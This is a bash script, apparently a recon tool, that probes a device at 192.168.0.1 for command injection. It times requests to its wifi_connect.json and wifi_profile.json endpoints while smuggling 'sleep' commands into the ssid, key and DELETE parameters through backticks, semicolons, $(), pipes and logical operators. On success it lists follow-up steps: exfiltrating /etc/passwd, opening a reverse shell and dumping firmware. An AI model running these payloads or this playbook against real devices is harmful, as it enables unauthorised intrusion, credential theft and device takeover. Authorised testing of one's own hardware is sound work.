#!/bin/bash
# Timing-based command injection detection script
# If command injection exists, sleep commands will delay the response

TARGET="192.168.0.1"
OUTPUT_DIR="../recon/api/injection_tests"
BASELINE_SAMPLES=3
SLEEP_DURATION=5

echo "=== Timing-Based Command Injection Test ==="
echo "Target: $TARGET"
echo

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Function to measure request time
time_request() {
    local url="$1"
    local start=$(date +%s.%N)
    curl -s -o /dev/null "$url"
    local end=$(date +%s.%N)
    local duration=$(echo "$end - $start" | bc)
    echo "$duration"
}

# Get baseline timing
echo "[*] Establishing baseline (normal request timing)..."
total=0
for i in $(seq 1 $BASELINE_SAMPLES); do
    duration=$(time_request "http://$TARGET/wifi_connect.json?ssid=baseline&key=test")
    echo "  Sample $i: ${duration}s"
    total=$(echo "$total + $duration" | bc)
done
baseline=$(echo "scale=3; $total / $BASELINE_SAMPLES" | bc)
echo "[+] Baseline average: ${baseline}s"
echo

# Test command injection with sleep
echo "[*] Testing command injection payloads (should delay ~${SLEEP_DURATION}s if vulnerable)..."
echo

declare -a payloads=(
    "test\`sleep ${SLEEP_DURATION}\`"
    "test;sleep ${SLEEP_DURATION};echo test"
    "test\$(sleep ${SLEEP_DURATION})"
    "test|sleep ${SLEEP_DURATION}"
    "test||sleep ${SLEEP_DURATION}||test"
    "test&&sleep ${SLEEP_DURATION}&&test"
)

vulnerable=0

for payload in "${payloads[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    url="http://$TARGET/wifi_connect.json?ssid=${encoded}&key=test"

    echo "Testing payload: $payload"
    duration=$(time_request "$url")
    echo "  Duration: ${duration}s"

    # Check if duration is significantly longer than baseline
    is_delayed=$(echo "$duration > ($baseline + $SLEEP_DURATION - 1)" | bc)

    if [ "$is_delayed" -eq 1 ]; then
        echo "  ⚠️  VULNERABILITY DETECTED! Response delayed by ~${SLEEP_DURATION}s"
        echo "  🚨 Command injection likely possible!"
        vulnerable=1
    else
        echo "  ✓ No significant delay"
    fi
    echo
done

# Test in password field
echo "[*] Testing password/key parameter..."
echo

for payload in "${payloads[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    url="http://$TARGET/wifi_connect.json?ssid=testnet&key=${encoded}"

    echo "Testing payload in key: $payload"
    duration=$(time_request "$url")
    echo "  Duration: ${duration}s"

    is_delayed=$(echo "$duration > ($baseline + $SLEEP_DURATION - 1)" | bc)

    if [ "$is_delayed" -eq 1 ]; then
        echo "  ⚠️  VULNERABILITY DETECTED! Response delayed by ~${SLEEP_DURATION}s"
        echo "  🚨 Command injection likely possible in key parameter!"
        vulnerable=1
    else
        echo "  ✓ No significant delay"
    fi
    echo
done

# Test DELETE endpoint
echo "[*] Testing DELETE /wifi_profile.json..."
echo

for payload in "${payloads[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    url="http://$TARGET/wifi_profile.json?ssid=${encoded}"

    echo "Testing payload in DELETE: $payload"
    start=$(date +%s.%N)
    curl -s -o /dev/null -X DELETE "$url"
    end=$(date +%s.%N)
    duration=$(echo "$end - $start" | bc)
    echo "  Duration: ${duration}s"

    is_delayed=$(echo "$duration > ($baseline + $SLEEP_DURATION - 1)" | bc)

    if [ "$is_delayed" -eq 1 ]; then
        echo "  ⚠️  VULNERABILITY DETECTED! Response delayed by ~${SLEEP_DURATION}s"
        echo "  🚨 Command injection likely possible in DELETE endpoint!"
        vulnerable=1
    else
        echo "  ✓ No significant delay"
    fi
    echo
done

echo "=== Test Complete ==="
if [ $vulnerable -eq 1 ]; then
    echo "🚨 COMMAND INJECTION VULNERABILITY DETECTED!"
    echo "VULNERABLE" > "$OUTPUT_DIR/result.txt"
    echo
    echo "Next steps:"
    echo "1. Use successful payload for information gathering"
    echo "2. Try to exfiltrate /etc/passwd"
    echo "3. Attempt to establish reverse shell"
    echo "4. Dump firmware from /dev/mtdblock0"
else
    echo "✓ No timing-based command injection detected"
    echo "NOT_VULNERABLE" > "$OUTPUT_DIR/result.txt"
    echo "This doesn't rule out command injection completely - server might not process commands synchronously"
fi

echo
echo "Results saved to $OUTPUT_DIR/"
